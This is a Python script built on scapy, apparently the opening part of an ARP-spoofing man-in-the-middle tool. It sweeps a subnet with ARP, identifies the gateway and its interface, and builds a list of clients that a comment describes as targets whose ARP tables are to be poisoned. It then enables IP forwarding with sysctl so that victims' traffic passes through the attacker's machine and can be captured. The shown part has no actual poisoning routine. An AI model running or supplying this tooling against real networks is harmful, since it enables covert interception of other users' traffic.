import scapy.all as scapy
import subprocess
import sys
import time
import os
from ipaddress import IPv4Network
import threading

# Will get the current working directory 
cwd = os.getcwd()

# Function to check if the script is being runwith sudo priviledges
# If not it will stop
def in_sudo_mode():
    if not 'SUDO_UID' in os.environ.keys():
        print("Try running this program with sudo")
        exit()

def arp_scan(ip_range):
    """We use arping method in scapy
    
    ip_range->an example is 10.0.0.0/24"""

    # We create an empty list to store the pair of ARP responses.
    arp_responses=list()
    # We send the arp packets through the network, verbose is set to 0 so it wont show any output.
    # returns two lists. We are interested in the answered lists at index 0.
    answered_lst = scapy.arping(ip_range, verbose=0)[0]

    # We loop through all the responses and add them to a dictionary and append them to the list of arp_responses
    for res in answered_lst:
        arp_responses.append({"ip" : res[1].psrc, "mac" : res[1].hwsrc})
    return arp_responses

def is_gateway(gateway_ip):
    """We can see the gateway ip address by running the route -n command
    gateway_ip -> program finds should be supplied as an argument"""
    
    # Running the route -n command which returns information about gateways
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    # Looping through every row in the route -n command
    for row in result:
        # We look to see if the gateway_ip is in the row, if it is we return True. If False program continues flow and returns False.
        if gateway_ip in row:
            return True

    return False

def get_interface_names():
    # changing directories toget interface names from /sys/class/net
    os.chdir("/sys/class/net")
    interface_names = os.listdir()
    return interface_names

def match_iface_name(row):
    #We get all interface names by running the function defined above
    interface_names  = get_interface_names()

    # Check if the interface name is in the row. If it is then we return the iface name
    for iface in interface_names:
        if iface in row:
            return iface

def gateway_info(network_info):
    # network_info -> We supply the arp_scan() data
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    #Declaring an empty list for gateways
    gateways = []
    for iface in network_info:
        for row in result:
            if iface ["ip"] in row:
                iface_name = match_iface_name(row)
                #Once we find the gateway, we create a dictionary with all of its names.
                gateways.append({"iface" : iface_name, "ip" : iface["ip"], "mac" : iface["mac"]})
    return gateways

def clients(arp_res, gateway_res):
    """This function returns a list with only the clients. the gateway is removed from the list.
    arp_res -> The response from the ARP scan
    gateway_res -> The response from the gateway_info function."""
    # Clearing the menu so only you have access to clients whose arp tables you want to poison
    client_list = []
    for gateway in gateway_res:
        for item in arp_res:
            #All items which are not the gateway will append to the client list.
            if gateway["ip"] != item['ip']:
                client_list.append(item)
    # return the list with the clients which will be used for the menu
    return client_list


def allow_ip_forwarding():
    """Running this function allows ip forwarding. The packets will flow through your machine, and you'll be able to capture them. Otherwise user will lose connection."""

    #normally this is run sysctl -w net.ipv4.ip_forward=1 to enable ip forwarding. We run subprocess.run()
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    # Load  in sysctl settings from the /etc/sysctl.conf file. 
    subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])